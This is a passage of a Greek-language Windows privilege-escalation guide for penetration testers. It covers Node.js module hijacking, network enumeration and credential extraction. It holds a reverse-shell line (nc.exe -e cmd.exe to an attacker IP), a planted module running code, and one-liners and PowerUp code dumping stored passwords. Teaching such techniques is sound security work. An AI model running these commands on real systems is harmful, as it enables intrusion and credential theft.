- μια βιβλιοθήκη τρίτου μέρους περιβάλλει το `require("foo")` με `try/catch` και συνεχίζει σε περίπτωση αποτυχίας
- ένα package αφαιρέθηκε από τα production builds, παραλείφθηκε κατά τη συσκευασία ή απέτυχε να εγκατασταθεί
- το ευάλωτο `require()` βρίσκεται βαθιά στο dependency tree αντί στον κώδικα της κύριας εφαρμογής

### Εντοπισμός ευάλωτων στόχων

Χρησιμοποιήστε το **Procmon** για να επιβεβαιώσετε τη διαδρομή επίλυσης:<sup>[[23]](#references)</sup>

- Φιλτράρετε με βάση το `Process Name` = το εκτελέσιμο του στόχου (`node.exe`, το EXE της εφαρμογής Electron ή η διεργασία wrapper)
- Φιλτράρετε με βάση το `Path` που `contains` `node_modules`
- Εστιάστε στα `NAME NOT FOUND` και στο τελικό επιτυχές άνοιγμα κάτω από το `C:\node_modules`

Χρήσιμα μοτίβα κατά την ανασκόπηση κώδικα σε αποσυσκευασμένα αρχεία `.asar` ή στον πηγαίο κώδικα της εφαρμογής:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Εκμετάλλευση

1. Εντοπίστε το **όνομα πακέτου που λείπει** από το Procmon ή μέσω εξέτασης του κώδικα.
2. Δημιουργήστε τον ριζικό κατάλογο αναζήτησης, αν δεν υπάρχει ήδη:

```powershell
mkdir C:\node_modules
```

3. Τοποθετήστε ένα module με το ακριβώς αναμενόμενο όνομα:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Ενεργοποιήστε την εφαρμογή-θύμα. Αν η εφαρμογή επιχειρήσει `require("foo")` και το νόμιμο module απουσιάζει, το Node μπορεί να φορτώσει το `C:\node_modules\foo.js`.

Παραδείγματα προαιρετικών modules που απουσιάζουν και ταιριάζουν σε αυτό το μοτίβο είναι τα `bluebird` και `utf-8-validate`, αλλά το **technique** είναι το επαναχρησιμοποιήσιμο στοιχείο: βρείτε οποιοδήποτε **missing bare import** που θα επιλύσει μια προνομιούχα διεργασία Windows Node/Electron.

### Ιδέες για εντοπισμό και ενίσχυση της ασφάλειας

- Ενεργοποιήστε ειδοποίηση όταν ένας χρήστης δημιουργεί το `C:\node_modules` ή γράφει εκεί νέα αρχεία/πακέτα `.js`.
- Αναζητήστε διεργασίες υψηλής ακεραιότητας που διαβάζουν από το `C:\node_modules\*`.
- Συμπεριλάβετε όλα τα runtime dependencies στην παραγωγή και ελέγξτε τη χρήση του `optionalDependencies`.
- Ελέγξτε τον κώδικα τρίτων για μοτίβα `try { require("...") } catch {}` που δεν εμφανίζουν σφάλματα.
- Απενεργοποιήστε τις προαιρετικές δοκιμές αν το υποστηρίζει η βιβλιοθήκη (για παράδειγμα, ορισμένες εγκαταστάσεις του `ws` μπορούν να παρακάμψουν την παλιά δοκιμή `utf-8-validate` με `WS_NO_UTF_8_VALIDATE=1`).

## Δίκτυο

### Κοινόχρηστοι πόροι

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### Αρχείο hosts

Ελέγξτε αν υπάρχουν άλλοι γνωστοί υπολογιστές καταχωρισμένοι στατικά στο αρχείο hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Διεπαφές δικτύου και DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Ανοιχτές θύρες

Ελέγξτε από έξω για **περιορισμένες υπηρεσίες**

```bash
netstat -ano #Opened ports?
```

Για έναν τοπικό listener, συσχετίστε το PID του με τον κάτοχο της διεργασίας, τη διαδρομή του εκτελέσιμου αρχείου και οποιαδήποτε υπηρεσία ή προγραμματισμένη εργασία τον εκκινεί. Μια υπηρεσία απομακρυσμένου ελέγχου μπορεί να παρέχει πρόσβαση ως ο χρήστης της επιφάνειας εργασίας μόνο αν το επιτρέπουν οι μηχανισμοί ελέγχου ταυτότητας και οι έλεγχοι εντολών της. Μια προσαρμοσμένη εφαρμογή TCP που εκτελείται με λογαριασμό αυξημένων προνομίων αποτελεί ξεχωριστό στόχο ελέγχου: ο listener και η διαδρομή του εκτελέσιμου αρχείου είναι παθητικές ενδείξεις, ενώ μια διαδρομή αλλοίωσης μνήμης που απαιτεί έλεγχο ταυτότητας προϋποθέτει ανάλυση του συγκεκριμένου εκτελέσιμου αρχείου και των εισόδων στις οποίες έχει πρόσβαση. Αν μια εκτεθειμένη θύρα φαίνεται να ανήκει σε διεργασία συστήματος, συγκρίνετέ την με την [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) προτού αποδώσετε την υπηρεσία υποβάθρου· ένας κανόνας προώθησης από μόνος του δεν αποδεικνύει ότι ο προορισμός είναι προσβάσιμος ή ευάλωτος.

### Πίνακας δρομολόγησης

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Πίνακας ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Κανόνες τείχους προστασίας

[**Δείτε αυτή τη σελίδα για εντολές σχετικές με το τείχος προστασίας**](../basic-cmd-for-pentesters.md#firewall) **(προβολή κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερες[ εντολές για απαρίθμηση δικτύου εδώ](../basic-cmd-for-pentesters.md#network)

### Υποσύστημα Windows για Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Το δυαδικό αρχείο `bash.exe` μπορεί επίσης να βρίσκεται στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσετε χρήστη root, μπορείτε να ακούτε σε οποιαδήποτε θύρα (την πρώτη φορά που χρησιμοποιείτε το `nc.exe` για να ακούσετε σε μια θύρα, θα εμφανιστεί ένα GUI που θα σας ρωτά αν θέλετε να επιτρέψετε το `nc` μέσω του firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Για να ξεκινήσεις εύκολα το bash ως root, μπορείς να δοκιμάσεις το `--default-user root`

Μπορείς να εξερευνήσεις το σύστημα αρχείων του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Το Linux `root` μέσα στο WSL δεν παρέχει από μόνο του δικαιώματα Windows Administrator. Αν η τρέχουσα ταυτότητα Windows μπορεί να διαβάσει το σύστημα αρχείων μιας διανομής, έλεγξε τα αρχεία ιστορικού κελύφους (συμπεριλαμβανομένου του `/root/.bash_history`) για εντολές στις οποίες ενδέχεται να έχουν καταγραφεί διαπιστευτήρια· η κλιμάκωση εξακολουθεί να απαιτεί έγκυρο λογαριασμό με υψηλότερα προνόμια και επιτρεπόμενη μέθοδο ελέγχου ταυτότητας. Η δομή `LocalState\rootfs` αφορά παλαιότερες εγκαταστάσεις WSL· το WSL 2 συνήθως αποθηκεύει τη διανομή σε έναν εικονικό δίσκο [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), επομένως εντόπισε πρώτα την πραγματική διανομή και τη διαδρομή αποθήκευσής της. Απόφυγε να εμφανίζεις τα περιεχόμενα του ιστορικού κατά την αυτοματοποιημένη απαρίθμηση.

## Διαπιστευτήρια Windows

### Διαπιστευτήρια Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Αντιμετωπίστε τα `DefaultUserName` και `DefaultDomainName` ως στοιχεία του λογαριασμού, όχι ως διαπιστευτήρια. Μια μη κενή τιμή `DefaultPassword` ή `AltDefaultPassword` αποτελεί εύρημα plaintext στο μητρώο. Αν το `AutoAdminLogon=1`, αλλά δεν είναι αναγνώσιμος κανένας plaintext κωδικός πρόσβασης, αυτό αποτελεί μόνο ένδειξη: το [Sysinternals Autologon μπορεί να αποθηκεύει τον κωδικό πρόσβασης ως μυστικό LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), και οι συνήθεις αναγνώσεις του μητρώου δεν αποδεικνύουν αν αυτό το μυστικό υπάρχει ή αν μπορεί να ανακτηθεί. Ελέγξτε τα δικαιώματα πρόσβασης και την πραγματική διαμόρφωση σύνδεσης πριν αναφέρετε έκθεση διαπιστευτηρίων.

### Διαχειριστής διαπιστευτηρίων / Windows Vault

Από το [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Το Windows Vault αποθηκεύει διαπιστευτήρια χρηστών για διακομιστές, ιστοτόπους και άλλα προγράμματα, τα οποία μπορούν να χρησιμοποιηθούν από τα **Windows** για να **συνδέουν αυτόματα τους χρήστες**. Αρχικά, μπορεί να φαίνεται ότι οι χρήστες μπορούν να αποθηκεύουν διαπιστευτήρια για ιστοτόπους όπως το Facebook, το Twitter ή το Gmail και να συνδέονται αυτόματα μέσω των προγραμμάτων περιήγησης, αλλά δεν λειτουργεί έτσι.

Το Windows Vault αποθηκεύει διαπιστευτήρια με τα οποία τα Windows μπορούν να συνδέουν αυτόματα τους χρήστες. Αυτό σημαίνει ότι κάθε **εφαρμογή Windows που χρειάζεται διαπιστευτήρια για πρόσβαση σε έναν πόρο** (διακομιστή ή ιστότοπο) **μπορεί να χρησιμοποιήσει αυτόν τον Credential Manager** και το Windows Vault, ώστε να χρησιμοποιεί τα παρεχόμενα διαπιστευτήρια αντί οι χρήστες να εισάγουν κάθε φορά το όνομα χρήστη και τον κωδικό πρόσβασης.

Αν οι εφαρμογές δεν αλληλεπιδρούν με τον Credential Manager, δεν νομίζω ότι μπορούν να χρησιμοποιήσουν τα διαπιστευτήρια για έναν δεδομένο πόρο. Επομένως, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει με κάποιον τρόπο να **επικοινωνήσει με τον Credential Manager και να ζητήσει τα διαπιστευτήρια για αυτόν τον πόρο** από το προεπιλεγμένο vault αποθήκευσης.

Χρησιμοποιήστε το `cmdkey` για να εμφανίσετε τα αποθηκευμένα διαπιστευτήρια στον υπολογιστή.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το `runas` με την επιλογή `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Το ακόλουθο παράδειγμα εκτελεί ένα απομακρυσμένο binary μέσω ενός SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Χρήση του `runas` με ένα παρεχόμενο σύνολο διαπιστευτηρίων.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Σημειώστε ότι μπορείτε να χρησιμοποιήσετε τα mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ή το [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Οι σύγχρονες εφαρμογές Windows UWP, το Microsoft Edge και οι σύγχρονες υπηρεσίες συστήματος αποθηκεύουν tokens αυθεντικοποίησης και plaintext passwords μέσα στο Universal Windows Platform (UWP) `PasswordVault` (που εμφανίζεται επίσης ως `Web Credentials` στο `vaultcmd`). Αυτός ο χώρος αποθήκευσης είναι απομονωμένος ανά συνεδρία και μπορεί να αποκρυπτογραφηθεί εγγενώς, χωρίς δικαιώματα διαχειριστή ή `SeDebugPrivilege`.

Εκτελέστε αυτήν την εντολή PowerShell μέσα στην ενεργή συνεδρία του χρήστη για να κάνετε αμέσως dump και αποκρυπτογράφηση όλων των αποθηκευμένων usernames και plaintext passwords:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Το **Data Protection API (DPAPI)** παρέχει μια μέθοδο συμμετρικής κρυπτογράφησης δεδομένων, η οποία χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος, το οποίο συνεισφέρει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προκύπτει από τα μυστικά σύνδεσης του χρήστη**. Σε περιπτώσεις κρυπτογράφησης συστήματος, χρησιμοποιεί τα μυστικά ελέγχου ταυτότητας τομέα του συστήματος.

Τα κρυπτογραφημένα RSA κλειδιά χρήστη, μέσω DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το `{SID}` αντιπροσωπεύει το [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) του χρήστη. **Το κλειδί DPAPI, που βρίσκεται στον ίδιο κατάλογο με το κύριο κλειδί το οποίο προστατεύει τα ιδιωτικά κλειδιά του χρήστη, στο ίδιο αρχείο**, αποτελείται συνήθως από 64 bytes τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, οπότε δεν είναι δυνατή η εμφάνιση των περιεχομένων του μέσω της εντολής `dir` στο CMD, αν και μπορεί να εμφανιστεί μέσω του PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα ορίσματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **αρχεία διαπιστευτηρίων που προστατεύονται από τον κύριο κωδικό πρόσβασης** βρίσκονται συνήθως στα:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για αποκρυπτογράφηση.\
Μπορείτε να **εξαγάγετε πολλά DPAPI** **masterkeys** από τη **μνήμη** με το module `sekurlsa::dpapi` (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Διαπιστευτήρια PowerShell

Τα **διαπιστευτήρια PowerShell** χρησιμοποιούνται συχνά για **scripting** και εργασίες αυτοματοποίησης, ως ένας βολικός τρόπος αποθήκευσης κρυπτογραφημένων διαπιστευτηρίων. Τα διαπιστευτήρια προστατεύονται με **DPAPI**, πράγμα που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη, στον ίδιο υπολογιστή στον οποίο δημιουργήθηκαν.

Ένα εξαγόμενο διαπιστευτήριο μπορεί να έχει οποιοδήποτε όνομα αρχείου ή διαδρομή `.xml`. Αν ένα script ή μια απογραφή αρχείων παραπέμπει σε αυτό, εντοπίστε τον πραγματικό κατάλογο προφίλ του λογαριασμού αντί να υποθέσετε ότι βρίσκεται στο `C:\Users`: [Τα Windows μπορούν να τοποθετούν τα προφίλ αλλού](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Ένα αρχείο που μπορείτε να διαβάσετε είναι απλώς ένα στοιχείο για περαιτέρω διερεύνηση· [η `Export-Clixml` των Windows δεσμεύει ένα κρυπτογραφημένο διαπιστευτήριο στον χρήστη και τον υπολογιστή που το εξήγαγαν](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), ενώ κάθε λογαριασμός που ανακτάται πρέπει ξεχωριστά να έχει έγκυρα δικαιώματα στην προβλεπόμενη υπηρεσία. Εξετάστε πρώτα τις διαδρομές και τις ACL, χωρίς να εμφανίζετε κρυπτογραφημένες ή απλού κειμένου τιμές κατά τη συνήθη απαρίθμηση.

Για να **αποκρυπτογραφήσετε** διαπιστευτήρια PS από το αρχείο που τα περιέχει, μπορείτε να κάνετε το εξής:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Αποθηκευμένες συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Εντολές που εκτελέστηκαν πρόσφατα

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Διαχειριστής διαπιστευτηρίων απομακρυσμένης επιφάνειας εργασίας**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Χρησιμοποιήστε το module `dpapi::rdg` του **Mimikatz** με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε τυχόν αρχεία .rdg**\
Μπορείτε να **εξαγάγετε πολλά DPAPI masterkeys** από τη μνήμη με το module `sekurlsa::dpapi` του Mimikatz

**Το mRemoteNG χρησιμοποιεί διαφορετικό χώρο αποθήκευσης συνδέσεων.** Εξετάστε αναγνώσιμα XML στον φάκελο `%APPDATA%\mRemoteNG` και στα Documents του χρήστη, συμπεριλαμβανομένων αρχείων με συνηθισμένα ονόματα όπως `config.xml`. Εντοπίστε το schema των συνδέσεων και τα κρυπτογραφημένα attributes `Password` προτού θεωρήσετε ένα αρχείο XML πιθανό εύρημα διαπιστευτηρίων. Η αποθηκευμένη τιμή δεν είναι κωδικός πρόσβασης DPAPI/RDCMan· η ανάκτησή της εξαρτάται από τις ρυθμίσεις κρυπτογράφησης του αρχείου και από το αν χρησιμοποιήθηκε προσαρμοσμένος κύριος κωδικός πρόσβασης. Αποφύγετε την εκτύπωση κρυπτογραφημένων τιμών κατά τη μαζική αναζήτηση.

**Οι εξαγωγές προφίλ του Remote Desktop Plus** μπορεί επίσης να είναι αναγνώσιμες σε καταλόγους χρηστών ή σε κοινόχρηστο φάκελο διαχείρισης. Μια παλαιού τύπου εξαγωγή `profiles.xml` περιλαμβάνει καταχωρίσεις `Data/Profile` με στοιχεία `ProfileName`, `Password` και `Secure`. Αντιμετωπίστε ένα μη κενό στοιχείο password ως πιθανό εύρημα διαπιστευτηρίων, χωρίς να το εκτυπώσετε ή να υποθέσετε ότι είναι σε plaintext: [ο προμηθευτής αναφέρει](https://www.donkz.nl/) ότι η προστασία προφίλ μπορεί να συνδέεται με τον λογαριασμό και τον υπολογιστή που τη δημιούργησαν ή να έχει ρυθμιστεί με λιγότερο αυστηρό τρόπο. Επιβεβαιώστε την προέλευση του αρχείου και τις προϋποθέσεις ανάκτησης προτού βασιστείτε σε αυτό.

### Sticky Notes

Οι χρήστες συχνά χρησιμοποιούν την εφαρμογή Sticky Notes σε σταθμούς εργασίας Windows για να **αποθηκεύουν κωδικούς πρόσβασης** και άλλες πληροφορίες, χωρίς να αντιλαμβάνονται ότι πρόκειται για αρχείο βάσης δεδομένων. Αυτό το αρχείο βρίσκεται στη θέση `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και αξίζει πάντα να το αναζητήσετε και να το εξετάσετε.

Οι χρήστες μερικές φορές αποθηκεύουν κωδικούς πρόσβασης και άλλες πληροφορίες σε εφαρμογές αυτοκόλλητων σημειώσεων. Η packaged εφαρμογή Sticky Notes της Microsoft αποθηκεύει συνήθως τις σημειώσεις στη θέση `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`· παλαιότερες ή διαφορετικές εφαρμογές ενδέχεται να χρησιμοποιούν άλλους χώρους αποθήκευσης στο προφίλ χρήστη, συμπεριλαμβανομένου του LevelDB. Εντοπίστε την εγκατεστημένη εφαρμογή και τη μορφή αποθήκευσης προτού θεωρήσετε ότι η απουσία αρχείου SQLite σημαίνει πως δεν υπάρχουν σημειώσεις.

Αν το Sticky Notes χρησιμοποιεί SQLite write-ahead logging, ένα αντίγραφο μόνο του `plum.sqlite` μπορεί να παραλείπει πρόσφατες committed σημειώσεις. Διατηρήστε το αντίστοιχο `plum.sqlite-wal` μαζί με ένα συνεπές αντίγραφο της βάσης δεδομένων και συμπεριλάβετε το `plum.sqlite-shm` όταν είναι διαθέσιμο· το shared-memory index μπορεί να αναδημιουργηθεί, αλλά το WAL αποτελεί μέρος της μόνιμης κατάστασης της βάσης δεδομένων. Δείτε την [τεκμηρίωση WAL του SQLite](https://www.sqlite.org/wal.html). Μια σημείωση που περιέχει όνομα λογαριασμού ή κωδικό πρόσβασης αποτελεί μόνο πιθανό εύρημα διαπιστευτηρίων: επαληθεύστε ξεχωριστά τον λογαριασμό, την επιτρεπόμενη πρόσβαση και την επαναχρησιμοποίηση του κωδικού πρόσβασης. Μια κρυπτογραφημένη εγγραφή password manager απαιτεί επίσης το πραγματικό κλειδί αποκρυπτογράφησης και ερμηνεία ειδική για την εφαρμογή, προτού μπορέσει να τεκμηριώσει σύνδεση με αυξημένα προνόμια.

### AppCmd.exe

**Σημειώστε ότι για να ανακτήσετε κωδικούς πρόσβασης από το AppCmd.exe πρέπει να είστε Administrator και να εκτελείτε το πρόγραμμα με επίπεδο High Integrity.**\
Το **AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\
Αν αυτό το αρχείο υπάρχει, είναι πιθανό να έχουν ρυθμιστεί ορισμένα **διαπιστευτήρια** και να είναι δυνατή η **ανάκτησή** τους.

Αυτός ο κώδικας προέρχεται από το [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe` .\
Τα installers **εκτελούνται με προνόμια SYSTEM**, πολλά είναι ευάλωτα σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Αρχεία και Registry (Διαπιστευτήρια)

### Απομεινάρια διαπιστευτηρίων στο Registry εργαλείων υποστήριξης

Ορισμένες παλαιότερες εγκαταστάσεις απομακρυσμένης υποστήριξης διατηρούν ονόματα τιμών σχετικών με κωδικούς πρόσβασης σε σταθερά κλειδιά Registry της εφαρμογής. Για παράδειγμα, το `SecurityPasswordAES` του TeamViewer προσδιόριζε έναν διαμορφωμένο στατικό κωδικό πρόσβασης συνεδρίας σε εκδόσεις πριν από την 9, σύμφωνα με την [εξήγηση του προμηθευτή για το κλειδί Registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Ένας δείκτης ονόματος τιμής αποτελεί μόνο ένδειξη προς διερεύνηση: επαληθεύστε την εγκατεστημένη έκδοση, αν τα δεδομένα της τιμής είναι αναγνώσιμα, τη μορφή τους και την τρέχουσα συμπεριφορά ελέγχου ταυτότητας πριν αξιολογήσετε το συγκεκριμένο διαπιστευτήριο. Η μετάβαση από έναν κωδικό πρόσβασης απομακρυσμένης υποστήριξης σε έναν λογαριασμό Windows με περισσότερα δικαιώματα απαιτεί επιπλέον να χρησιμοποιείται πράγματι ο ίδιος κωδικός πρόσβασης και να υπάρχει εξουσιοδότηση για αυτόν τον λογαριασμό. Μην περιλαμβάνετε κρυπτογραφημένο κείμενο ή ανακτημένους κωδικούς πρόσβασης στη συνήθη έξοδο απαρίθμησης.

### Κοινόχρηστα υπολογιστικά φύλλα με προστατευμένα φύλλα

Αν υπάρχει υποψία ότι ένα αναγνώσιμο κοινόχρηστο βιβλίο εργασίας περιέχει δεδομένα λογαριασμών, διακρίνετε την **κρυπτογράφηση αρχείου** από την προστασία φύλλου εργασίας ή τις κρυφές στήλες. Η [Microsoft αναφέρει](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) ότι η προστασία φύλλου εργασίας ελέγχει την επεξεργασία και δεν αποτελεί χαρακτηριστικό ασφαλείας· από μόνη της δεν αποδεικνύει ότι τα περιεχόμενα του βιβλίου εργασίας είναι κρυπτογραφημένα. Εξετάζετε μόνο εξουσιοδοτημένα και σχετικά αρχεία και αποφύγετε την εμφάνιση πιθανών μυστικών κατά την ευρεία απαρίθμηση. Μια αναγνώσιμη διαδρομή `.xlsx`, ένα προστατευμένο φύλλο ή μια κρυφή στήλη από μόνα τους δεν αποδεικνύουν ότι υπάρχουν διαπιστευτήρια ή ότι κάποιος λογαριασμός έχει περισσότερα δικαιώματα· επαληθεύστε ξεχωριστά τα πραγματικά δεδομένα και τα τρέχοντα δικαιώματα του λογαριασμού.

### Διατηρημένα patches αλλαγών σε διακομιστή CI

